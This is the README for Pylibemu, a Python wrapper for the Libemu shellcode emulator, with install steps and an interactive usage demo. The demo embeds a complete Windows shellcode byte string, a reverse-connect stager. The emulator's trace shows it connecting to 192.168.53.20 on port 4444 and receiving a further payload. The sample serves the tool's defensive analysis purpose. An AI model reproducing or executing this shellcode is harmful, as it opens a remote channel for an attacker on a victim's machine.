
## Pylibemu

Pylibemu is a wrapper for the Libemu library (https://github.com/buffer/libemu).


## Requirements

- Python 2.5 or later
- Libemu


## Installation

To install Pylibemu, just execute:

$ sudo pip install pylibemu

or alternatively

$ python setup.py build
$ sudo python setup.py install


## Usage


buffer@alnitak ~ $ python
Python 2.6.6 (r266:84292, Feb 26 2011, 12:20:05) 
[GCC 4.4.4] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pylibemu
>>> shellcode  = b"\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d"
>>> shellcode += b"\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34"
>>> shellcode += b"\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0"
>>> shellcode += b"\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9"
>>> shellcode += b"\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c"
>>> shellcode += b"\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
>>> shellcode += b"\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32"
>>> shellcode += b"\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53"
>>> shellcode += b"\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02"
>>> shellcode += b"\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6"
>>> shellcode += b"\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3"
>>> shellcode += b"\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50"
>>> shellcode += b"\x53\x57\x53\x66\xb9\xc0\x38\xff\xe6"
>>> emulator = pylibemu.Emulator()
>>> offset = emulator.shellcode_getpc_test(shellcode)
>>> offset
4
>>> emulator.prepare(shellcode, offset)
>>> emulator.test()
0
>>> print emulator.emu_profile_output
HMODULE LoadLibraryA (
     LPCTSTR lpFileName = 0x0012fe90 => 
           = "ws2_32";
) = 0x71a10000;
int WSAStartup (
     WORD wVersionRequested = 2;
     LPWSADATA lpWSAData = 1244272;
) =  0;
SOCKET WSASocket (
     int af = 2;
     int type = 1;
     int protocol = 0;
     LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
     GROUP g = 0;
     DWORD dwFlags = 0;
) =  66;
int connect (
     SOCKET s = 66;
     struct sockaddr_in * name = 0x0012fe88 => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 339060928 (host=192.168.53.20);
             };
             char sin_zero = "       ";
         };
     int namelen = 16;
) =  0;
int recv (
     SOCKET s = 66;
     char * buf = 0x0012fe88 => 
         none;
     int len = 3072;
     int flags = 0;
) =  3072;

>>> emulator.emu_profile_truncated
False


The new Emulator method `run' was introduced in Pylibemu 0.1.3  which allows not to 
worry about details. Moreover the new Emulator attribute `offset' allows to get such
information if needed. 
 

>>> emulator = pylibemu.Emulator()
>>> emulator.run(shellcode)
0
>>> emulator.offset
4
>>> print emulator.emu_profile_output
HMODULE LoadLibraryA (
     LPCTSTR = 0x01a3f990 => 
           = "ws2_32";
) =  1906376704;
int WSAStartup (
     WORD wVersionRequested = 2;
     LPWSADATA lpWSAData = 1244272;
) =  0;
SOCKET WSASocket (
     int af = 2;
     int type = 1;
     int protocol = 0;
     LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
     GROUP g = 0;
     DWORD dwFlags = 0;
) =  66;
int connect (
     SOCKET s = 66;
     struct sockaddr_in * name = 0x0012fe88 => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 339060928 (host=192.168.53.20);
             };
             char sin_zero = "       ";
         };
     int namelen = 16;
) =  0;
int recv (
     SOCKET s = 66;
     char * = 0x01a40870 => 
         none;
     int len = 3072;
     int flags = 0;
) =  3072;

>>> emulator.emu_profile_truncated
False


The Emulator accepts the optional parameter `output_size' which defines how much memory 
will be reserved for storing the emulation profile dump. By default, its size is 1MB but 
it be can changed in two possible ways

>>> emulator = pylibemu.Emulator(1024)

>>> emulator = pylibemu.Emulator()
>>> emulator.set_output_size(1024)

If the reserved memory is not enough to contain the entire dump, the dump will be truncated 
and the Emulator attribute `emu_profile_truncated' will be set to True. This approach is 
needed in order not to penalize performances while analyzing some shellcodes which may produce 
several MBs dumps (such as the Metasploit windows/download_exec). If the entire dump is needed 
a really simple approach could be to check the `emu_profile_truncated' attribute after the 
shellcode emulation test, increase the reserved memory through the Emulator `set_output_size' 
method and subsequently run the shellcode emulation test again as shown above.


## License information

Copyright (C) 2011-2015 Angelo Dell'Aera <buffer@antifork.org>

License: GNU General Public License, version 2 or later; see LICENSE.txt
         included in this archive for details.

